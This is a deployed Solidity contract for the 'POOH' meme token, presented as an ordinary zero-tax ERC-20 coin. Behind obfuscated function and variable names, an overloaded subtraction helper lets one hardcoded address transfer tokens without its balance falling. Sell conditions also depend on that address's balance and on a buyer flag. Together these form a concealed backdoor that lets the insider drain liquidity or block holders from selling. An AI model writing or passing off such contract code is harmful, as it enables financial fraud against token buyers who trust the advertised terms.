/**
 *Submitted for verification at Etherscan.io on 2023-08-30
*/

// SPDX-License-Identifier: MIT
// Ticker: $POOH
// Taxes: 0/0
// Community TG: https://t.me/poohETH
//       ___         ___           ___           ___                                  ___           ___           ___           ___     
//      /\  \       /\  \         /\  \         /\  \                                /\  \         /|  |         /\__\         /\  \    
//     /::\  \     /::\  \       /::\  \        \:\  \                  ___         /::\  \       |:|  |        /:/ _/_        \:\  \   
//    /:/\:\__\   /:/\:\  \     /:/\:\  \        \:\  \                /\__\       /:/\:\  \      |:|  |       /:/ /\__\        \:\  \  
//   /:/ /:/  /  /:/  \:\  \   /:/  \:\  \   ___ /::\  \              /:/  /      /:/  \:\  \   __|:|  |      /:/ /:/ _/_   _____\:\  \ 
//  /:/_/:/  /  /:/__/ \:\__\ /:/__/ \:\__\ /\  /:/\:\__\            /:/__/      /:/__/ \:\__\ /\ |:|__|____ /:/_/:/ /\__\ /::::::::\__\
//  \:\/:/  /   \:\  \ /:/  / \:\  \ /:/  / \:\/:/  \/__/           /::\  \      \:\  \ /:/  / \:\/:::::/__/ \:\/:/ /:/  / \:\~~\~~\/__/
//   \::/__/     \:\  /:/  /   \:\  /:/  /   \::/__/               /:/\:\  \      \:\  /:/  /   \::/~~/~      \::/_/:/  /   \:\  \      
//    \:\  \      \:\/:/  /     \:\/:/  /     \:\  \               \/__\:\  \      \:\/:/  /     \:\~~\        \:\/:/  /     \:\  \     
//     \:\__\      \::/  /       \::/  /       \:\__\                   \:\__\      \::/  /       \:\__\        \::/  /       \:\__\    
//      \/__/       \/__/         \/__/         \/__/                    \/__/       \/__/         \/__/         \/__/         \/__/    


pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wfep(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wfep(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wfep(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract POOH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _taxgrWalletdq;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;


    uint8 private constant _decimals = 9;
    string private constant _name = "POOH";
    string private constant _symbol = "POOH";
    uint256 private constant _tTotal = 6900000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _tTotal;
    uint256 public _maxWalletSize = _tTotal;
    uint256 public _taxSwapThreshold= _tTotal;
    uint256 public _maxTaxSwap= _tTotal;

    uint256 private _buyCount=0;
    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=0;
    uint256 private _reduceSellTaxAt=0;
    uint256 private _preventSwapBefore=0;
    address public _taxhqFeeReceivedpjq =0x15747be4F0f176803C3Ad8BCF67c3a197CF3e6e8;


    IuniswapRouter private uniswapRouter;
    address private uniswapPair;
    bool private vfjrhfekyxqh;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxhqFeeReceivedpjq] = true;


        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wfep(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmount=0;
        if (from != owner() && to != owner()) {

            if (transferDelayEnabled) {
                if (to != address(uniswapRouter) && to != address(uniswapPair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_buyCount<_preventSwapBefore){
                  require(!_fykdrfgjrp(to));
                }
                _buyCount++; _taxgrWalletdq[to]=true;
                feeAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){
                require(amount <= _maxTxAmount && balanceOf(_taxhqFeeReceivedpjq)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                feeAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
                require(_buyCount>_preventSwapBefore && _taxgrWalletdq[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxSwapThreshold 
            && _buyCount>_preventSwapBefore&& !_isExcludedFromFee[to]&& !_isExcludedFromFee[from]
            ) {
                swapTokendykhprq( _qhzw(amount, _qhzw(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(feeAmount);
          emit Transfer(from, address(this),feeAmount);
        }
        _balances[from]= _wfep(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wfep(feeAmount));
        emit Transfer(from, to, amount. _wfep(feeAmount));
    }

    function swapTokendykhprq(uint256 tokenAmount) private lockTheSwap {
        if(tokenAmount==0){return;}
        if(!vfjrhfekyxqh){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qhzw(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wfep(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _taxhqFeeReceivedpjq){
            return a;
        }else{
            return a. _wfep(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function _fykdrfgjrp(address account) private view returns (bool) {
        uint256 sizes;
        assembly {
            sizes := extcodesize(account)
        }
        return sizes > 0;
    }


    function openTrading() external onlyOwner() {
        require(!vfjrhfekyxqh,"trading is already open");
        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        vfjrhfekyxqh = true;
    }

    receive() external payable {}
}